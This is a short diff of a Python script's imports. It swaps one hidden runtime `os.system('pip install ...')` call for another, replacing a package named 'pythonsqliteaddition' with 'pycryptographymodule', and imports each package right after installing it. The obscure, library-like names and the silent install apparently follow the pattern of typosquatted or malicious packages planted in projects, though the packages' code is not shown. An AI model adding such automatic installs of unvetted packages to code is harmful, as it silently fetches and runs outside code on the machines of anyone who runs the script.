@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteaddition")
-import pythonsqliteaddition
+os.system("pip install pycryptographymodule")
+import pycryptographymodule
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
